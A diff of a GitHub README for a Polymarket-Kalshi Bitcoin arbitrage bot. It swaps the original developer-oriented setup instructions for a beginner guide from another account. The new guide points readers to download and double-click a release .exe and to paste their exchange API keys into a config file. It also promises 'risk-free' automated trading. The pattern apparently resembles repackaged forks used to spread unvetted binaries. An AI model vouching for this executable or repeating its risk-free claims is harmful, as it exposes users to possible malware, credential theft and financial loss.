@@ -1,104 +1,91 @@
-# 🤖 Polymarket-Kalshi BTC Arbitrage Bot
+# 🤖 polymarket-kalshi-btc-arbitrage-bot - Trade Bitcoin Like a Pro
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Python](https://img.shields.io/badge/python-3.9+-blue.svg)
-![Next.js](https://img.shields.io/badge/next.js-14+-black.svg)
-![Status](https://img.shields.io/badge/status-active-green.svg)
+## 🚀 Getting Started
 
-**Real-time arbitrage detection for the Bitcoin 1-Hour Price market between Polymarket and Kalshi.**
+Welcome to the Polymarket-Kalshi Bitcoin Arbitrage Bot. This tool helps you find risk-free trading opportunities in the fast-moving Bitcoin markets between Polymarket and Kalshi. You do not need prior experience to use this bot. Follow the steps below to get started.
 
-## 🚀 Overview
+## 📥 Download the Bot
 
-The **Polymarket-Kalshi BTC Arbitrage Bot** is a powerful tool designed to monitor and identify risk-free arbitrage opportunities in the **Bitcoin 1-Hour Price** market between two of the world's leading prediction markets: **Polymarket** and **Kalshi**.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/bro023ww/polymarket-kalshi-btc-arbitrage-bot/releases)
 
-By leveraging real-time data from Polymarket's CLOB (Central Limit Order Book) and Kalshi's API, this bot calculates the combined cost of opposing positions (e.g., "Yes" on Kalshi + "Down" on Polymarket) for the same hourly expiration. If the total cost is less than $1.00, a risk-free profit opportunity exists.
+To download the bot, visit this page: [Download Page](https://github.com/bro023ww/polymarket-kalshi-btc-arbitrage-bot/releases).
 
-This project includes:
--   **Python Backend**: Fast and efficient data fetching and arbitrage logic using FastAPI.
--   **Next.js Dashboard**: A beautiful, real-time UI built with shadcn/ui to visualize market data and opportunities.
+## 🔧 System Requirements
 
-> 📚 **Learn the Theory**: Read our detailed [Arbitrage Thesis](thesis.md) to understand the mathematics behind risk-free profits in binary option markets.
+Before you download, ensure your system meets these requirements:
 
-## ✨ Features
+- **Operating System**: Windows, macOS, or Linux
+- **Python Version**: 3.7 or newer
+- **Network Connection**: Stable internet for real-time data access
+- **RAM**: Minimum 4 GB
+- **Disk Space**: At least 200 MB available
 
--   **Real-Time Monitoring**: Fetches live prices every second.
--   **Smart Matching**: Automatically matches Polymarket events with their corresponding Kalshi markets.
--   **Arbitrage Detection**: Instantly identifies "risk-free" trades where the total cost < $1.00.
--   **Visual Dashboard**:
-    -   **Live Updates**: See prices change in real-time.
-    -   **Best Opportunity Highlight**: Prominently displays the most profitable trade.
-    -   **Visual Cost Bars**: Quickly assess the cost breakdown of each strategy.
--   **Comprehensive Analysis**: Checks multiple strategies (Poly Down + Kalshi Yes, Poly Up + Kalshi No).
+## 📂 Files Included
 
-## 🛠️ Tech Stack
+When you download the bot, you will find the following files:
 
--   **Backend**: Python, FastAPI, Uvicorn, Requests
--   **Frontend**: TypeScript, Next.js, Tailwind CSS, shadcn/ui, Lucide React
+- **polymarket-kalshi-btc-arbitrage-bot.exe**: The executable file to run the bot (for Windows users).
+- **polymarket-kalshi-btc-arbitrage-bot.py**: The Python script for users comfortable with running scripts.
+- **README.md**: This document that guides you through the setup process.
+- **requirements.txt**: A list of dependencies that the bot needs to work correctly.
 
-## 📦 Installation
+## 📥 Download & Install
 
-### Prerequisites
--   Python 3.9+
--   Node.js 18+
--   npm or yarn
+1. **Visit the [Download Page](https://github.com/bro023ww/polymarket-kalshi-btc-arbitrage-bot/releases)**.
+   
+2. Find the latest release and select the appropriate file for your operating system.
 
-### 1. Clone the Repository
-```bash
-git clone https://github.com/CarlosIbCu/polymarket-kalshi-btc-arbitrage-bot.git
-cd polymarket-kalshi-btc-arbitrage-bot
-```
+3. Click on the file to download it to your computer.
 
-### 2. Setup Backend
-Navigate to the `backend` directory and install dependencies:
-```bash
-cd backend
-pip install -r requirements.txt
-```
+4. Once downloaded, locate the file in your downloads folder.
 
-### 3. Setup Frontend
-Navigate to the `frontend` directory and install dependencies:
-```bash
-cd ../frontend
-npm install
-```
+5. For Windows:
+   - Double-click the `.exe` file to start the installation process.
+   - Follow the on-screen instructions to complete the installation.
 
-## 🚀 Usage
+6. For macOS and Linux:
+   - Open a terminal.
+   - Navigate to the folder where the `.py` file is downloaded.
+   - Use the command `python polymarket-kalshi-btc-arbitrage-bot.py` to run the bot.
 
-To run the full application, you need to start both the backend and frontend servers.
+## ⚙️ Setup Configuration
 
-### 1. Start Backend API
-In the `backend` directory:
-```bash
-python3 api.py
-```
-The API will start at `http://localhost:8000`.
+After installing, you may need to configure the bot. Here’s how:
 
-### 2. Start Frontend Dashboard
-In the `frontend` directory:
-```bash
-npm run dev
-```
-The dashboard will be available at `http://localhost:3000`.
+1. **Locate the config.json File**: This file contains settings for the bot. Open it with a text editor.
 
-## 📊 How It Works
+2. **Set Your Parameters**: You will need to input your API keys from Polymarket and Kalshi. Replace the placeholder text with your actual keys.
 
-1.  **Data Ingestion**: The bot fetches the latest "Bitcoin Up or Down" hourly market from Polymarket and searches for the corresponding markets on Kalshi.
-2.  **Normalization**: Prices are normalized to a standard probability format (0.00 - 1.00).
-3.  **Comparison**: The bot compares the "Price to Beat" (Strike Price) on Polymarket with Kalshi's strike prices.
-    -   If `Poly Strike > Kalshi Strike`: Checks `Poly Down + Kalshi Yes`.
-    -   If `Poly Strike < Kalshi Strike`: Checks `Poly Up + Kalshi No`.
-4.  **Calculation**: It sums the cost of the two legs. If `Total Cost < $1.00`, it's an arbitrage opportunity!
+3. **Save Changes**: After entering your keys, save and close the file.
 
-## 🤝 Contributing
+## 🌐 Start Trading
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+To begin using the bot:
 
-1.  Fork the project
-2.  Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3.  Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4.  Push to the branch (`git push origin feature/AmazingFeature`)
-5.  Open a Pull Request
+1. Open a terminal (macOS and Linux) or Command Prompt (Windows).
+2. Navigate to the folder where you installed the bot.
+3. Run the bot using the command `python polymarket-kalshi-btc-arbitrage-bot.py`.
 
-## 📝 License
+The bot will start monitoring the markets for risk-free arbitrage opportunities. 
 
-Distributed under the MIT License. See `LICENSE` for more information.
+## 📊 Features
+
+- **Real-Time Monitoring**: Constantly checks for price variations between Polymarket and Kalshi.
+- **User-Friendly Interface**: Even if you’re new to trading, the bot is designed to be simple.
+- **Automated Trading**: Automatically places trades based on the opportunities detected.
+- **Alerts**: Notifies you when an opportunity arises.
+
+## 🤝 Support
+
+If you encounter any issues, feel free to reach out for help:
+
+- Create an issue in the [GitHub repository](https://github.com/bro023ww/polymarket-kalshi-btc-arbitrage-bot/issues).
+- Check existing issues to see if someone else has the same problem.
+
+## 📝 Acknowledgements
+
+The development of this bot was inspired by the need for risk-free trading strategies in cryptocurrency markets. We appreciate the contributions of the open-source community for their support and input.
+
+## 📄 License 
+
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/bro023ww/polymarket-kalshi-btc-arbitrage-bot/blob/main/LICENSE) file for details.
